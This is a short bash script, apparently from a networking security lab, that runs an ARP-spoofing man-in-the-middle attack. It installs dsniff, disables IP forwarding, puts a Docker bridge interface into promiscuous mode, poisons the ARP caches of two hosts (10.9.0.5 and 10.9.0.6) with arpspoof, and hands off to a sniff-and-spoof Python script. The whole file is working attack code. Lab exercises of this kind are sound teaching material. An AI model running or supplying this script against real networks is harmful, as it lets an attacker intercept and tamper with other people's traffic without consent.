# #!/bin/bash

# Update package list and install dsniff
apt-get update
apt-get install -y dsniff

# Disables IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Get interfaces starting with "br-" and remove the colon
interface=$(ifconfig | grep -o '^br-[^ ]*' | cut -d':' -f1)

ifconfig $interface promisc   

# Start arpspoof in the background and get their process IDs
arpspoof -i $interface 10.9.0.5 &
arpspoof_pid1=$!
arpspoof -i $interface 10.9.0.6 &
arpspoof_pid2=$!

# Define a cleanup function to stop arpspoof when the script exits
cleanup() {
    kill $arpspoof_pid1
    kill $arpspoof_pid2
}

# Set the trap to call cleanup on script exit
trap cleanup EXIT

# Wait for arpspoof to work
sleep 4

# Run the Python script and wait for it to finish
python3 sniff-spoof.py $interface

# Explicitly call cleanup in case the trap doesn't catch
cleanup